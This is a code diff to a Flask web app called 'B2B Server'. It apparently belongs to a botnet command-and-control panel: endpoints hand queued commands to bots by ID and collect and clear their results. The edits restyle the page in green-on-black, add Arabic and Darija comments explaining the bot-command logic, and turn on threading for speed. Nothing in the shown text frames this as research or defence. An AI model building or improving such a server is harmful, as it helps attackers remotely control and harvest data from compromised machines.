@@ -19,11 +19,11 @@ def index():
     <head>
         <title>B2B Server</title>
         <style>
-            body { background: #0a0a0a; color: #0a0a0a; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .box { border: 2px solid #f1ebf1; padding: 40px; text-align: center; background: #000; }
+            body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .box { border: 2px solid #00ff00; padding: 40px; text-align: center; background: #000; }
             h1 { font-size: 48px; margin: 0; }
-            .sub { color: #0a0a0a; font-size: 14px; margin-top: 10px; }
-        </style
+            .sub { color: #006600; font-size: 14px; margin-top: 10px; }
+        </style>
     </head>
     <body>
         <div class="box">
@@ -51,6 +51,7 @@ def get_command(bot_id):
     if bot_id not in bots:
         return jsonify({"command": ""})
     
+    # نبحث عن أي أمر مرتبط بهذا البوت
     for session_id, session in sessions.items():
         if session.get("bot_id") == bot_id:
             if session.get("commands"):
@@ -123,8 +124,9 @@ def get_results(session_id):
         return jsonify({"results": []})
     
     results = sessions[session_id]["results"]
-    sessions[session_id]["results"] = []
+    sessions[session_id]["results"] = []  # نمسح النتائج بعد جلبها
     return jsonify({"results": results})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    # 🔥 Zidna threaded=True باش يزيد السرعة
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
